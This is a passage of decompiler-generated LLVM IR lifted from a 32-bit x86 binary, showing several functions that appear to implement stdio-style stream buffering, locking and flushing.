  %storemerge6 = phi i32 [ %v1_804c8d7, %dec_label_pc_804c8d0 ], [ -1, %dec_label_pc_804c8dc ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804c8e2 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804c8e2, i32* @ebx, align 4
  store i32 %v0_804c523, i32* @esi, align 4
  store i32 %v0_804c522, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_804c86e, { 0, 2, 1 }
  uselistorder i32 %v1_804c829, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804c81c, { 1, 0 }
  uselistorder i32 %v5_804c816, { 1, 2, 0 }
  uselistorder i32 %v0_804c829, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804c7f7, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804c80d, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_804c788, { 1, 2, 0 }
  uselistorder i32 %v1_804c75e, { 1, 2, 0 }
  uselistorder i32 %v0_804c788, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804c723, { 1, 0 }
  uselistorder i32 %v1_804c712, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804c71b, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804c705, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804c6fb, { 1, 0 }
  uselistorder i32 %v1_804c6dd, { 1, 0 }
  uselistorder i32 %v0_804c6fb.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804c6c0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804c6b7, { 1, 2, 0 }
  uselistorder i32 %v0_804c67d, { 1, 0 }
  uselistorder i32 %v1_804c66f, { 1, 0 }
  uselistorder i32 %v1_804c66a, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804c668, { 2, 0, 1 }
  uselistorder i32 %v0_804c68a, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804c625, { 1, 2, 0 }
  uselistorder i32 %v0_804c5fd, { 0, 1, 2, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_804c5f0.lcssa, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_804c5e9.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_804c5f3, { 1, 2, 0 }
  uselistorder i32 %v6_804c5f1, { 0, 2, 1 }
  uselistorder i32 %v1_804c5f0, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804c5e9, { 2, 1, 0 }
  uselistorder i32 %v1_804c5e1, { 1, 0 }
  uselistorder i32 %v1_804c5e9137, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v0_804c5d9, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_804c5cc, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_804c5c7, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804c59d, { 0, 2, 1 }
  uselistorder i32 %v2_804c58c, { 1, 0 }
  uselistorder i32 %v0_804c58a, { 2, 0, 1 }
  uselistorder i32 %v4_804c524, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 0, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @function_804c4f8, { 1, 0 }
  uselistorder i32 -9, { 1, 0, 2 }
  uselistorder i32 -5, { 2, 0, 1 }
  uselistorder i32 -134557815, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8053081.128 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804c8df, { 1, 0 }
  uselistorder label %dec_label_pc_804c8dc, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804c8d0, { 1, 0 }
  uselistorder label %dec_label_pc_804c8a5, { 1, 0 }
  uselistorder label %dec_label_pc_804c86a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c816, { 1, 0 }
  uselistorder label %dec_label_pc_804c7ea, { 1, 0 }
  uselistorder label %dec_label_pc_804c752, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c71f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c6f6, { 1, 0 }
  uselistorder label %dec_label_pc_804c6cd, { 1, 0 }
  uselistorder label %dec_label_pc_804c694, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804c637, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c5f0, { 1, 0 }
  uselistorder label %dec_label_pc_804c5e1, { 1, 0 }
  uselistorder label %dec_label_pc_804c5d7, { 1, 0 }
  uselistorder label %dec_label_pc_804c5c0, { 1, 0 }
  uselistorder label %dec_label_pc_804c5c0.outer, { 2, 0, 1 }
}

define i32 @function_804c8e8(i32* %arg1) local_unnamed_addr {
dec_label_pc_804c8e8:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v12_804c8eb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp5, i32* %esi.global-to-local, align 4
  %v1_804c8f2 = add i32 %tmp5, 52
  %v2_804c8f2 = inttoptr i32 %v1_804c8f2 to i32*
  %v3_804c8f2 = load i32, i32* %v2_804c8f2, align 4
  %v1_804c8f5 = icmp eq i32 %v3_804c8f2, 0
  %v1_804c8f7 = icmp eq i1 %v1_804c8f5, false
  br i1 %v1_804c8f7, label %dec_label_pc_804c918.thread, label %dec_label_pc_804c91e

dec_label_pc_804c918.thread:                      ; preds = %dec_label_pc_804c8e8
  %v2_804c91816 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804c92f

dec_label_pc_804c91e:                             ; preds = %dec_label_pc_804c8e8
  %v1_804c8f9 = add i32 %tmp5, 56
  store i32 %v12_804c8eb, i32* @eax, align 4
  %v2_804c908 = call i32 @function_804ec6e(i32 %v12_804c8eb, i32 134540395)
  %v1_804c910 = call i32 @function_804ec6b(i32 %v1_804c8f9)
  %v0_804c918.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804c918 = inttoptr i32 %v0_804c918.pre to i32*
  %v2_804c918 = load i32, i32* %v1_804c918, align 4
  store i32 %v12_804c8eb, i32* @eax, align 4
  %v2_804c927 = call i32 @function_804ec6e(i32 %v12_804c8eb, i32 1)
  br label %dec_label_pc_804c92f

dec_label_pc_804c92f:                             ; preds = %dec_label_pc_804c918.thread, %dec_label_pc_804c91e
  %v0_804c92f = phi i32 [ %v2_804c918, %dec_label_pc_804c91e ], [ %v2_804c91816, %dec_label_pc_804c918.thread ]
  %v1_804c934 = and i32 %v0_804c92f, 4
  ret i32 %v1_804c934

; uselistorder directives
  uselistorder i32 %v12_804c8eb, { 2, 3, 0, 1 }
  uselistorder i32 %tmp5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c92f, { 1, 0 }
}

define i32 @function_804c93c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804c93c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804c93c = load i32, i32* @edi, align 4
  %v0_804c93d = load i32, i32* @esi, align 4
  %v0_804c93e = load i32, i32* @ebx, align 4
  %v12_804c93f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804c946 = add i32 %arg3, 52
  %v2_804c946 = inttoptr i32 %v1_804c946 to i32*
  %v3_804c946 = load i32, i32* %v2_804c946, align 4
  store i32 %v3_804c946, i32* @edi, align 4
  %v1_804c949 = icmp eq i32 %v3_804c946, 0
  %v1_804c94b = icmp eq i1 %v1_804c949, false
  br i1 %v1_804c94b, label %dec_label_pc_804c93c.dec_label_pc_804c96c_crit_edge, label %dec_label_pc_804c94d

dec_label_pc_804c93c.dec_label_pc_804c96c_crit_edge: ; preds = %dec_label_pc_804c93c
  br label %dec_label_pc_804c96c

dec_label_pc_804c94d:                             ; preds = %dec_label_pc_804c93c
  %v1_804c94d = add i32 %arg3, 56
  store i32 %v1_804c94d, i32* @ebx, align 4
  store i32 %v12_804c93f, i32* @eax, align 4
  %v2_804c95c = call i32 @function_804ec6e(i32 %v12_804c93f, i32 134540395)
  %v0_804c961 = load i32, i32* @ebx, align 4
  %v1_804c964 = call i32 @function_804ec6b(i32 %v0_804c961)
  %v0_804c96d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c96c

dec_label_pc_804c96c:                             ; preds = %dec_label_pc_804c93c.dec_label_pc_804c96c_crit_edge, %dec_label_pc_804c94d
  %v0_804c96d = phi i32 [ %arg3, %dec_label_pc_804c93c.dec_label_pc_804c96c_crit_edge ], [ %v0_804c96d.pre, %dec_label_pc_804c94d ]
  %v0_804c96c = load i32, i32* @edx, align 4
  %v4_804c976 = inttoptr i32 %arg1 to i8*
  %v5_804c976 = call i32 @function_804cc5c(i8* %v4_804c976, i32 %arg2, i32 %v0_804c96d, i32 %v0_804c96c)
  store i32 %v5_804c976, i32* %ebx.global-to-local, align 4
  br i1 %v1_804c94b, label %dec_label_pc_804c995, label %dec_label_pc_804c984

dec_label_pc_804c984:                             ; preds = %dec_label_pc_804c96c
  store i32 %v12_804c93f, i32* @eax, align 4
  %v2_804c98d = call i32 @function_804ec6e(i32 %v12_804c93f, i32 1)
  %v0_804c998.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c995

dec_label_pc_804c995:                             ; preds = %dec_label_pc_804c96c, %dec_label_pc_804c984
  %v0_804c998 = phi i32 [ %v5_804c976, %dec_label_pc_804c96c ], [ %v0_804c998.pre, %dec_label_pc_804c984 ]
  store i32 %v0_804c93e, i32* @ebx, align 4
  store i32 %v0_804c93d, i32* @esi, align 4
  store i32 %v0_804c93c, i32* @edi, align 4
  ret i32 %v0_804c998

; uselistorder directives
  uselistorder i32 %v12_804c93f, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804c995, { 1, 0 }
  uselistorder label %dec_label_pc_804c96c, { 1, 0 }
}

define i32 @function_804c9a0(i8 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804c9a0:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804c9a0 = load i32, i32* @edi, align 4
  %v0_804c9a1 = load i32, i32* @esi, align 4
  %v0_804c9a2 = load i32, i32* @ebx, align 4
  %v12_804c9a3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v4_804c9aa = sext i8 %arg1 to i32
  store i32 %v4_804c9aa, i32* @edi, align 4
  %v1_804c9ae = add i32 %arg2, 52
  %v2_804c9ae = inttoptr i32 %v1_804c9ae to i32*
  %v3_804c9ae = load i32, i32* %v2_804c9ae, align 4
  %v4_804c9ae = icmp eq i32 %v3_804c9ae, 0
  br i1 %v4_804c9ae, label %dec_label_pc_804c9d6, label %dec_label_pc_804c9b4

dec_label_pc_804c9b4:                             ; preds = %dec_label_pc_804c9a0
  %v1_804c9b4 = add i32 %arg2, 16
  %v2_804c9b4 = inttoptr i32 %v1_804c9b4 to i32*
  %v3_804c9b4 = load i32, i32* %v2_804c9b4, align 4
  store i32 %v3_804c9b4, i32* %eax.global-to-local, align 4
  %v2_804c9b7 = add i32 %arg2, 28
  %v3_804c9b7 = inttoptr i32 %v2_804c9b7 to i32*
  %v4_804c9b7 = load i32, i32* %v3_804c9b7, align 4
  %v10_804c9b7 = icmp ult i32 %v3_804c9b4, %v4_804c9b7
  %v1_804c9ba = icmp eq i1 %v10_804c9b7, false
  br i1 %v1_804c9ba, label %dec_label_pc_804c9c9, label %dec_label_pc_804c9bc

dec_label_pc_804c9bc:                             ; preds = %dec_label_pc_804c9b4
  store i32 %v4_804c9aa, i32* @edx, align 4
  %v3_804c9be = inttoptr i32 %v3_804c9b4 to i8*
  store i8 %arg1, i8* %v3_804c9be, align 1
  %v0_804c9c0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c9c0 = add i32 %v0_804c9c0, 1
  store i32 %v1_804c9c0, i32* %eax.global-to-local, align 4
  %v0_804c9c1 = load i32, i32* @edx, align 4
  %v1_804c9c1 = urem i32 %v0_804c9c1, 256
  store i32 %v1_804c9c1, i32* %ebx.global-to-local, align 4
  %v1_804c9c4 = load i32, i32* @esi, align 4
  %v2_804c9c4 = add i32 %v1_804c9c4, 16
  %v3_804c9c4 = inttoptr i32 %v2_804c9c4 to i32*
  store i32 %v1_804c9c0, i32* %v3_804c9c4, align 4
  br label %dec_label_pc_804ca29

dec_label_pc_804c9c9:                             ; preds = %dec_label_pc_804c9b4
  %v4_804c9cd = call i32 @function_804ccc8(i8 %arg1, i32 %arg2)
  store i32 %v4_804c9cd, i32* %eax.global-to-local, align 4
  store i32 %v4_804c9cd, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ca26

dec_label_pc_804c9d6:                             ; preds = %dec_label_pc_804c9a0
  %v1_804c9d6 = add i32 %arg2, 56
  store i32 %v1_804c9d6, i32* @ebx, align 4
  store i32 %v12_804c9a3, i32* @eax, align 4
  %sext = mul i32 %v12_804c9a3, 16777216
  %v1_804c9e5 = sdiv i32 %sext, 16777216
  %v3_804c9e5 = call i32 @function_804ec6e(i32 %v1_804c9e5, i32 134540395)
  store i32 %v3_804c9e5, i32* %eax.global-to-local, align 4
  %v0_804c9ea = load i32, i32* @ebx, align 4
  %sext1 = mul i32 %v0_804c9ea, 16777216
  %v1_804c9ed = sdiv i32 %sext1, 16777216
  %v2_804c9ed = call i32 @function_804ec6b(i32 %v1_804c9ed)
  store i32 %v2_804c9ed, i32* %eax.global-to-local, align 4
  %v0_804c9f2 = load i32, i32* @esi, align 4
  %v1_804c9f2 = add i32 %v0_804c9f2, 16
  %v2_804c9f2 = inttoptr i32 %v1_804c9f2 to i32*
  %v3_804c9f2 = load i32, i32* %v2_804c9f2, align 4
  store i32 %v3_804c9f2, i32* %eax.global-to-local, align 4
  %v2_804c9f8 = add i32 %v0_804c9f2, 28
  %v3_804c9f8 = inttoptr i32 %v2_804c9f8 to i32*
  %v4_804c9f8 = load i32, i32* %v3_804c9f8, align 4
  %v10_804c9f8 = icmp ult i32 %v3_804c9f2, %v4_804c9f8
  %v1_804c9fb = icmp eq i1 %v10_804c9f8, false
  %v0_804ca0d = load i32, i32* @edi, align 4
  br i1 %v1_804c9fb, label %dec_label_pc_804ca0a, label %dec_label_pc_804c9fd

dec_label_pc_804c9fd:                             ; preds = %dec_label_pc_804c9d6
  store i32 %v0_804ca0d, i32* @edx, align 4
  %v1_804c9ff = trunc i32 %v0_804ca0d to i8
  %v3_804c9ff = inttoptr i32 %v3_804c9f2 to i8*
  store i8 %v1_804c9ff, i8* %v3_804c9ff, align 1
  %v0_804ca01 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca01 = add i32 %v0_804ca01, 1
  store i32 %v1_804ca01, i32* %eax.global-to-local, align 4
  %v0_804ca02 = load i32, i32* @edx, align 4
  %v1_804ca02 = urem i32 %v0_804ca02, 256
  store i32 %v1_804ca02, i32* %ebx.global-to-local, align 4
  %v1_804ca05 = load i32, i32* @esi, align 4
  %v2_804ca05 = add i32 %v1_804ca05, 16
  %v3_804ca05 = inttoptr i32 %v2_804ca05 to i32*
  store i32 %v1_804ca01, i32* %v3_804ca05, align 4
  br label %dec_label_pc_804ca18

dec_label_pc_804ca0a:                             ; preds = %dec_label_pc_804c9d6
  %v5_804ca0d = trunc i32 %v0_804ca0d to i8
  %v4_804ca0e = call i32 @function_804ccc8(i8 %v5_804ca0d, i32 %v0_804c9f2)
  store i32 %v4_804ca0e, i32* %eax.global-to-local, align 4
  store i32 %v4_804ca0e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ca18

dec_label_pc_804ca18:                             ; preds = %dec_label_pc_804c9fd, %dec_label_pc_804ca0a
  store i32 %v12_804c9a3, i32* @eax, align 4
  %v3_804ca21 = call i32 @function_804ec6e(i32 %v1_804c9e5, i32 1)
  store i32 %v3_804ca21, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ca26

dec_label_pc_804ca26:                             ; preds = %dec_label_pc_804c9c9, %dec_label_pc_804ca18
  br label %dec_label_pc_804ca29

dec_label_pc_804ca29:                             ; preds = %dec_label_pc_804c9bc, %dec_label_pc_804ca26
  %v0_804ca2c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804ca2c, i32* %eax.global-to-local, align 4
  store i32 %v0_804c9a2, i32* @ebx, align 4
  store i32 %v0_804c9a1, i32* @esi, align 4
  store i32 %v0_804c9a0, i32* @edi, align 4
  ret i32 %v0_804ca2c

; uselistorder directives
  uselistorder i32 %v0_804ca0d, { 2, 1, 0 }
  uselistorder i32 %v1_804c9e5, { 1, 0 }
  uselistorder i32 %v12_804c9a3, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_804ca29, { 1, 0 }
  uselistorder label %dec_label_pc_804ca26, { 1, 0 }
  uselistorder label %dec_label_pc_804ca18, { 1, 0 }
}

define i32 @function_804ca34() local_unnamed_addr {
dec_label_pc_804ca34:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804ca43 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804ca43, i32* @eax, align 4
  %v2_804ca48 = call i32 @function_804ec6e(i32 %v2_804ca43, i32 134540395)
  %v1_804ca54 = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80557b8.107 to i32))
  %v0_804ca59 = load i32, i32* @global_var_8055e80.108, align 128
  %v8_804ca61 = icmp eq i32 %v0_804ca59, 1
  %v1_804ca62 = icmp eq i1 %v8_804ca61, false
  br i1 %v1_804ca62, label %dec_label_pc_804caf9, label %dec_label_pc_804ca68

dec_label_pc_804ca68:                             ; preds = %dec_label_pc_804ca34
  %v0_804ca68 = load i32, i32* @global_var_8055e84.109, align 4
  %tmp29 = icmp slt i32 %v0_804ca68, 1
  br i1 %tmp29, label %dec_label_pc_804caf9, label %dec_label_pc_804ca75

dec_label_pc_804ca75:                             ; preds = %dec_label_pc_804ca68
  store i32 0, i32* @esi, align 4
  %v2_804ca82 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804ca82, i32* @eax, align 4
  %v2_804ca87 = call i32 @function_804ec6e(i32 %v2_804ca82, i32 134540395)
  %v1_804ca93 = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80557a0.116 to i32))
  %v0_804ca98 = load i32, i32* bitcast (i32** @global_var_805579c.117 to i32*), align 4
  store i32 %v0_804ca98, i32* %edx.global-to-local, align 4
  %v1_804cada3 = icmp eq i32 %v0_804ca98, 0
  %v1_804cadc10 = icmp eq i1 %v1_804cada3, false
  br i1 %v1_804cadc10, label %dec_label_pc_804caa3, label %dec_label_pc_804cade

dec_label_pc_804caa3:                             ; preds = %dec_label_pc_804ca75, %dec_label_pc_804cad8
  %v0_804cab3 = phi i32 [ %v0_804cad8, %dec_label_pc_804cad8 ], [ %v0_804ca98, %dec_label_pc_804ca75 ]
  %v1_804caa313 = inttoptr i32 %v0_804cab3 to i16*
  %v2_804caa3 = load i16, i16* %v1_804caa313, align 2
  %v1_804caab = add i32 %v0_804cab3, 32
  %v2_804caab = inttoptr i32 %v1_804caab to i32*
  %v3_804caab = load i32, i32* %v2_804caab, align 4
  store i32 %v3_804caab, i32* @ebx, align 4
  %v1_804caa6 = and i16 %v2_804caa3, -32720
  %v6_804caae = icmp eq i16 %v1_804caa6, 48
  br i1 %v6_804caae, label %dec_label_pc_804cab7, label %dec_label_pc_804cab3

dec_label_pc_804cab3:                             ; preds = %dec_label_pc_804caa3
  store i32 %v0_804cab3, i32* @esi, align 4
  br label %dec_label_pc_804cad8

dec_label_pc_804cab7:                             ; preds = %dec_label_pc_804caa3
  %v0_804cab7 = load i32, i32* @esi, align 4
  %v1_804cab7 = icmp eq i32 %v0_804cab7, 0
  %v1_804cab9 = icmp eq i1 %v1_804cab7, false
  br i1 %v1_804cab9, label %dec_label_pc_804cac3, label %dec_label_pc_804cabb

dec_label_pc_804cabb:                             ; preds = %dec_label_pc_804cab7
  store i32 %v3_804caab, i32* bitcast (i32** @global_var_805579c.117 to i32*), align 4
  br label %dec_label_pc_804cac6

dec_label_pc_804cac3:                             ; preds = %dec_label_pc_804cab7
  %v2_804cac3 = add i32 %v0_804cab7, 32
  %v3_804cac3 = inttoptr i32 %v2_804cac3 to i32*
  store i32 %v3_804caab, i32* %v3_804cac3, align 4
  %v0_804cac6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cac6

dec_label_pc_804cac6:                             ; preds = %dec_label_pc_804cabb, %dec_label_pc_804cac3
  %v0_804cacf = phi i32 [ %v0_804cab3, %dec_label_pc_804cabb ], [ %v0_804cac6.pre, %dec_label_pc_804cac3 ]
  %v1_804cac6 = add i32 %v0_804cacf, 1
  %v2_804cac6 = inttoptr i32 %v1_804cac6 to i8*
  %v3_804cac6 = load i8, i8* %v2_804cac6, align 1
  %v4_804cac6 = and i8 %v3_804cac6, 32
  %v5_804cac6 = icmp eq i8 %v4_804cac6, 0
  br i1 %v5_804cac6, label %dec_label_pc_804cad8, label %dec_label_pc_804cacc

dec_label_pc_804cacc:                             ; preds = %dec_label_pc_804cac6
  %v1_804cad0 = call i32 @function_804e0e5(i32 %v0_804cacf)
  br label %dec_label_pc_804cad8

dec_label_pc_804cad8:                             ; preds = %dec_label_pc_804cac6, %dec_label_pc_804cab3, %dec_label_pc_804cacc
  %v0_804cad8 = load i32, i32* @ebx, align 4
  store i32 %v0_804cad8, i32* %edx.global-to-local, align 4
  %v1_804cada = icmp eq i32 %v0_804cad8, 0
  %v1_804cadc = icmp eq i1 %v1_804cada, false
  br i1 %v1_804cadc, label %dec_label_pc_804caa3, label %dec_label_pc_804cade

dec_label_pc_804cade:                             ; preds = %dec_label_pc_804cad8, %dec_label_pc_804ca75
  store i32 %v2_804ca82, i32* @eax, align 4
  %v2_804cae7 = call i32 @function_804ec6e(i32 %v2_804ca82, i32 1)
  store i32 0, i32* @global_var_8055e84.109, align 4
  %v0_804caf9.pre = load i32, i32* @global_var_8055e80.108, align 128
  br label %dec_label_pc_804caf9

dec_label_pc_804caf9:                             ; preds = %dec_label_pc_804ca68, %dec_label_pc_804ca34, %dec_label_pc_804cade
  %v0_804caf9 = phi i32 [ %v0_804ca59, %dec_label_pc_804ca68 ], [ %v0_804ca59, %dec_label_pc_804ca34 ], [ %v0_804caf9.pre, %dec_label_pc_804cade ]
  %v1_804cafe = add i32 %v0_804caf9, -1
  store i32 %v1_804cafe, i32* @global_var_8055e80.108, align 128
  store i32 %v2_804ca43, i32* @eax, align 4
  %v2_804cb0d = call i32 @function_804ec6e(i32 %v2_804ca43, i32 1)
  ret i32 %v2_804cb0d

; uselistorder directives
  uselistorder i32 %v0_804cad8, { 1, 2, 0 }
  uselistorder i32 %v0_804cab3, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804ca59, { 1, 2, 0 }
  uselistorder i16 48, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804caf9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cad8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cac6, { 1, 0 }
  uselistorder label %dec_label_pc_804caa3, { 1, 0 }
}

define i32 @function_804cb18(i16* %arg1) local_unnamed_addr {
dec_label_pc_804cb18:
  %stack_var_-32 = alloca i32, align 4
  %v0_804cb18 = load i32, i32* @ebp, align 4
  %v0_804cb19 = load i32, i32* @edi, align 4
  %v0_804cb1a = load i32, i32* @esi, align 4
  %v0_804cb1b = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_804cb21 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804cb21, i32* @ebx, align 4
  %v10_804cb25 = icmp eq i16* %arg1, inttoptr (i32 134567836 to i16*)
  br i1 %v10_804cb25, label %dec_label_pc_804cb3a, label %dec_label_pc_804cb2d

dec_label_pc_804cb2d:                             ; preds = %dec_label_pc_804cb18
  store i32 256, i32* @ebp, align 4
  %v2_804cb32 = icmp eq i16* %arg1, null
  %v1_804cb34 = icmp eq i1 %v2_804cb32, false
  br i1 %v1_804cb34, label %dec_label_pc_804cc29, label %dec_label_pc_804cb3a

dec_label_pc_804cb3a:                             ; preds = %dec_label_pc_804cb2d, %dec_label_pc_804cb18
  store i32 0, i32* @edi, align 4
  %v2_804cb47 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804cb47, i32* @ebx, align 4
  %v2_804cb4c = call i32 @function_804ec6e(i32 %v2_804cb47, i32 134540395)
  %v1_804cb58 = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80557b8.107 to i32))
  store i32 ptrtoint (i32* @global_var_80557b8.107 to i32), i32* @ecx, align 4
  %v0_804cb5e = load i32, i32* @global_var_8055e80.108, align 128
  %v1_804cb64 = add i32 %v0_804cb5e, 1
  store i32 %v1_804cb64, i32* @eax, align 4
  store i32 %v1_804cb64, i32* @global_var_8055e80.108, align 128
  %v2_804cb6d = call i32 @function_804ec6e(i32 %v2_804cb47, i32 1)
  store i32 %v2_804cb6d, i32* @eax, align 4
  %v2_804cb80 = call i32 @function_804ec6e(i32 %v2_804cb47, i32 134540395)
  %v1_804cb8c = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80557a0.116 to i32))
  store i32 ptrtoint (i32* @global_var_80557a0.116 to i32), i32* @eax, align 4
  %v0_804cb95 = load i32, i32* bitcast (i32** @global_var_805579c.117 to i32*), align 4
  store i32 %v0_804cb95, i32* @esi, align 4
  %v2_804cb9c = call i32 @function_804ec6e(i32 %v2_804cb47, i32 1)
  %v0_804cc1e1 = load i32, i32* @esi, align 4
  %v1_804cc1e2 = icmp eq i32 %v0_804cc1e1, 0
  %v1_804cc209 = icmp eq i1 %v1_804cc1e2, false
  br i1 %v1_804cc209, label %dec_label_pc_804cba6, label %dec_label_pc_804cc22

dec_label_pc_804cba6:                             ; preds = %dec_label_pc_804cb3a, %dec_label_pc_804cc1b
  %v0_804cbb4 = phi i32 [ %v3_804cc1b, %dec_label_pc_804cc1b ], [ %v0_804cc1e1, %dec_label_pc_804cb3a ]
  %v1_804cba6 = inttoptr i32 %v0_804cbb4 to i8*
  %v2_804cba6 = load i8, i8* %v1_804cba6, align 1
  %v3_804cba6 = and i8 %v2_804cba6, 64
  %v4_804cba6 = icmp eq i8 %v3_804cba6, 0
  br i1 %v4_804cba6, label %dec_label_pc_804cc1b, label %dec_label_pc_804cbab

dec_label_pc_804cbab:                             ; preds = %dec_label_pc_804cba6
  %v0_804cbab = load i32, i32* @global_var_80557d0.115, align 16
  %v9_804cbab = icmp eq i32 %v0_804cbab, 2
  br i1 %v9_804cbab, label %dec_label_pc_804cbd3, label %dec_label_pc_804cbb4

dec_label_pc_804cbb4:                             ; preds = %dec_label_pc_804cbab
  %v1_804cbb4 = add i32 %v0_804cbb4, 56
  store i32 %v1_804cbb4, i32* @ebx, align 4
  store i32 %v2_804cb47, i32* @eax, align 4
  %v2_804cbc3 = call i32 @function_804ec6e(i32 %v2_804cb47, i32 134540395)
  %v0_804cbc8 = load i32, i32* @ebx, align 4
  %v1_804cbcb = call i32 @function_804ec6b(i32 %v0_804cbc8)
  %v1_804cbd5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cbd3

dec_label_pc_804cbd3:                             ; preds = %dec_label_pc_804cbab, %dec_label_pc_804cbb4
  %v0_804cbe5 = phi i32 [ %v0_804cbb4, %dec_label_pc_804cbab ], [ %v1_804cbd5.pre, %dec_label_pc_804cbb4 ]
  %v0_804cbd3 = load i32, i32* @ebp, align 4
  %v2_804cbd5 = inttoptr i32 %v0_804cbe5 to i32*
  %v3_804cbd5 = load i32, i32* %v2_804cbd5, align 4
  %v4_804cbd5 = or i32 %v3_804cbd5, %v0_804cbd3
  %v2_804cbd7 = urem i32 %v4_804cbd5, 65536
  %v9_804cbd7 = and i32 %v2_804cbd7, 832
  %v2_804cbdb = icmp eq i32 %v9_804cbd7, 320
  %v1_804cbe0 = icmp eq i1 %v2_804cbdb, false
  br i1 %v1_804cbe0, label %dec_label_pc_804cc01, label %dec_label_pc_804cbe2

